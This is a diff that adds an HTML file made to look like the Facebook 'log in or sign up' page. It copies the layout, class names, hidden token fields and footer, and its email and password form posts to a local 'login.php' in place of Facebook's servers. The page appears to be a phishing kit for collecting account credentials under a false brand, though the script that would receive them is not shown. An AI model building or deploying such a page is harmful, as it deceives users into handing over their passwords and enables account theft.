@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en" id="facebook" class="no_js">
+<head>
+    <meta charset="utf-8" />
+    <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer" />
+    <title>Facebook - log in or sign up</title>
+    <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know." />
+    <link rel="icon" href="fb-ico.png" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+        
+        ._li {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        #globalContainer {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .fb_content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        ._8esj {
+            max-width: 1200px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 40px;
+        }
+        
+        ._8esk {
+            flex: 1;
+            max-width: 500px;
+        }
+        
+        ._8esl {
+            text-align: left;
+        }
+        
+        ._8ice {
+            margin-bottom: 20px;
+        }
+        
+        .fb_logo {
+            width: 301px;
+            height: 106px;
+            background-image: url('4lCu2zih0ca.svg');
+            background-repeat: no-repeat;
+            background-size: contain;
+            background-position: center;
+        }
+        
+        ._8eso {
+            font-size: 28px;
+            font-weight: normal;
+            color: #1c1e21;
+            line-height: 1.2;
+            margin: 0;
+        }
+        
+        ._8esn {
+            flex: 1;
+            max-width: 400px;
+        }
+        
+        ._8iep {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        ._6luv {
+            width: 100%;
+        }
+        
+        ._9vtf {
+            width: 100%;
+        }
+        
+        ._6lux {
+            margin-bottom: 12px;
+        }
+        
+        .inputtext {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: white;
+            color: #1c1e21;
+        }
+        
+        .inputtext:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+        
+        ._6luy {
+            width: 100%;
+        }
+        
+        ._55r1 {
+            font-size: 17px;
+        }
+        
+        ._1kbt {
+            position: relative;
+        }
+        
+        ._9npi {
+            padding-right: 50px;
+        }
+        
+        ._9ls7 {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+        
+        ._9lsa {
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        ._9lsb {
+            width: 16px;
+            height: 16px;
+            background: #8a8d91;
+            border-radius: 50%;
+            position: relative;
+        }
+        
+        ._9lsb::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+        }
+        
+        ._6ltg {
+            margin-bottom: 12px;
+        }
+        
+        ._42ft {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        ._4jy0 {
+            background: #1877f2;
+            color: white;
+        }
+        
+        ._4jy0:hover {
+            background: #166fe5;
+        }
+        
+        ._6lth {
+            font-size: 20px;
+        }
+        
+        ._4jy6 {
+            padding: 12px;
+        }
+        
+        ._4jy1 {
+            font-weight: bold;
+        }
+        
+        .selected {
+            background: #1877f2;
+        }
+        
+        ._51sy {
+            font-weight: bold;
+        }
+        
+        ._6ltj {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        ._6ltj a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        ._6ltj a:hover {
+            text-decoration: underline;
+        }
+        
+        ._8icz {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        ._6lti {
+            background: #42b883;
+            color: white;
+            text-align: center;
+            display: block;
+            margin: 0 auto;
+        }
+        
+        ._6lti:hover {
+            background: #369870;
+        }
+        
+        ._4jy2 {
+            font-weight: bold;
+        }
+        
+        ._58mk {
+            text-align: center;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        
+        ._8esh {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        ._8esh:hover {
+            text-decoration: underline;
+        }
+        
+        ._95ke {
+            margin-top: auto;
+        }
+        
+        ._8opy {
+            background: white;
+            padding: 20px 0;
+        }
+        
+        #pageFooter {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .localeSelectorList {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 20px;
+            font-size: 12px;
+        }
+        
+        .localeSelectorList li {
+            list-style: none;
+        }
+        
+        .localeSelectorList a {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+        
+        .localeSelectorList a:hover {
+            text-decoration: underline;
+        }
+        
+        .pageFooterLinkList {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 20px;
+            font-size: 12px;
+        }
+        
+        .pageFooterLinkList li {
+            list-style: none;
+        }
+        
+        .pageFooterLinkList a {
+            color: #8a8d91;
+            text-decoration: none;
+        }
+        
+        .pageFooterLinkList a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            text-align: center;
+            font-size: 11px;
+            color: #8a8d91;
+        }
+        
+        @media (max-width: 900px) {
+            ._8esj {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            ._8esl {
+                text-align: center;
+            }
+            
+            .fb_logo {
+                width: 250px;
+                height: 88px;
+            }
+            
+            ._8eso {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh gecko x1 Locale_en_US" dir="ltr">
+    <div class="_li" id="u_0_1_0E">
+        <div id="globalContainer" class="uiContextualLayerParent">
+            <div class="fb_content clearfix" id="content" role="main">
+                <div>
+                    <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
+                        <div class="_8esk">
+                            <div class="_8esl">
+                                <div class="_8ice">
+                                    <div class="fb_logo"></div>
+                                </div>
+                                <h2 class="_8eso">Connect with friends and the world around you on Facebook.</h2>
+                            </div>
+                        </div>
+                        <div class="_8esn">
+                            <div class="_8iep _8icy _9ahz _9ah-">
+                                <div class="_6luv _52jv">
+                                    <form class="_9vtf" data-testid="royal_login_form" action="login.php" method="post" id="u_0_2_RP">
+                                        <input type="hidden" name="jazoest" value="2957" autocomplete="off" />
+                                        <input type="hidden" name="lsd" value="AdFvpY-rX5g" autocomplete="off" />
+                                        <div>
+                                            <div class="_6lux">
+                                                <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal-email" placeholder="Email or phone number" autofocus="1" aria-label="Email or phone number" />
+                                            </div>
+                                            <div class="_6lux">
+                                                <div class="_6luy _55r1 _1kbt" id="passContainer">
+                                                    <input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal-pass" placeholder="Password" aria-label="Password" />
+                                                    <div class="_9ls7" id="u_0_3_Jl">
+                                                        <a href="#" role="button">
+                                                            <div class="_9lsa">
+                                                                <div class="_9lsb" id="u_0_4_vQ"></div>
+                                                            </div>
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login" />
+                                        <input type="hidden" autocomplete="off" name="next" value="" />
+                                        <input type="hidden" autocomplete="off" name="shared_prefs_data" value="" />
+                                        <div class="_6ltg">
+                                            <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal-login-button" type="submit" id="u_0_5_HF">Log In</button>
+                                        </div>
+                                        <div class="_6ltj">
+                                            <a href="#" id="u_0_6_EZ">Forgot password?</a>
+                                        </div>
+                                        <div class="_8icz"></div>
+                                        <div class="_6ltg">
+                                            <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="#" id="u_0_0_aC" data-testid="open-registration-form-button">Create new account</a>
+                                        </div>
+                                    </form>
+                                </div>
+                                <div id="reg_pages_msg" class="_58mk">
+                                    <a href="#" class="_8esh">Create a Page</a> for a celebrity, brand or business.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="">
+            <div class="_95ke _8opy">
+                <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
+                    <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
+                        <li>English (US)</li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="German" id="u_0_7_5i">Deutsch</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="Turkish" id="u_0_8_hv">Türkçe</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="Polish" id="u_0_9_/6">Polski</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="Italian" id="u_0_a_74">Italiano</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="Romanian" id="u_0_b_M8">Română</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="French (France)" id="u_0_c_OF">Français (France)</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="Russian" id="u_0_d_ro">Русский</a></li>
+                        <li><a class="_sv4" dir="rtl" href="#" title="Arabic" id="u_0_e_hp">العربية</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="Spanish" id="u_0_f_Vd">Español</a></li>
+                        <li><a class="_sv4" dir="ltr" href="#" title="Portuguese (Brazil)" id="u_0_g_a+">Português (Brasil)</a></li>
+                        <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" href="#" title="Show more languages" style="background: #f0f2f5; color: #65676b; border: none; padding: 4px 8px; font-size: 16px; border-radius: 4px;">+</a></li>
+                    </ul>
+                    <div id="contentCurve"></div>
+                    <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
+                        <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
+                            <li><a href="#" title="Sign Up for Facebook">Sign Up</a></li>
+                            <li><a href="#" title="Log into Facebook">Log In</a></li>
+                            <li><a href="#" title="Check out Messenger.">Messenger</a></li>
+                            <li><a href="#" title="Facebook Lite for Android.">Facebook Lite</a></li>
+                            <li><a href="#" title="Browse in Video">Video</a></li>
+                            <li><a href="#" title="Learn more about Meta Pay" target="_blank">Meta Pay</a></li>
+                            <li><a href="#" title="Check out Meta" target="_blank">Meta Store</a></li>
+                            <li><a href="#" title="Learn more about Meta Quest" target="_blank">Meta Quest</a></li>
+                            <li><a href="#" title="Learn more about Ray-Ban Meta" target="_blank">Ray-Ban Meta</a></li>
+                            <li><a href="#" title="Meta AI">Meta AI</a></li>
+                            <li><a href="#" title="Meta AI more content">Meta AI more content</a></li>
+                            <li><a href="#" title="Check out Instagram" target="_blank" rel="noreferrer nofollow">Instagram</a></li>
+                            <li><a href="#" title="Check out Threads">Threads</a></li>
+                            <li><a href="#" title="See the Voting Information Center.">Voting Information Center</a></li>
+                            <li><a href="#" title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a></li>
+                            <li><a href="#" title="Learn how to manage and control your privacy on Facebook.">Privacy Center</a></li>
+                            <li><a href="#" title="Learn about cookie settings of Facebook.">Cookie Settings</a></li>
+                            <li><a href="#" target="_blank">Cancel contracts here</a></li>
+                            <li><a href="#" accesskey="8" title="Read our blog, discover the resource center, and find job opportunities.">About</a></li>
+                            <li><a href="#" title="Advertise on Facebook.">Create ad</a></li>
+                            <li><a href="#" title="Create a page">Create Page</a></li>
+                            <li><a href="#" title="Develop on our platform.">Developers</a></li>
+                            <li><a href="#" title="Make your next career move to our awesome company.">Careers</a></li>
+                            <li><a href="#" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
+                            <li><a class="_41ug" data-nocookies="1" href="#" title="Learn about Ad Choices.">Ad choices</a></li>
+                            <li><a data-nocookies="1" href="#" accesskey="9" title="Review our terms and policies.">Imprint/Terms</a></li>
+                            <li><a href="#" accesskey="0" title="Visit our Help Center.">Help</a></li>
+                            <li><a href="#" title="Visit our Contact Uploading & Non-Users Notice.">Contact Uploading & Non-Users</a></li>
+                            <li><a accesskey="6" class="accessible_elem" href="#" title="View and edit your Facebook settings.">Settings</a></li>
+                            <li><a accesskey="7" class="accessible_elem" href="#" title="View your activity log">Activity log</a></li>
+                        </ul>
+                    </div>
+                    <div class="mvl copyright">
+                        <div><span> Meta © 2025</span></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
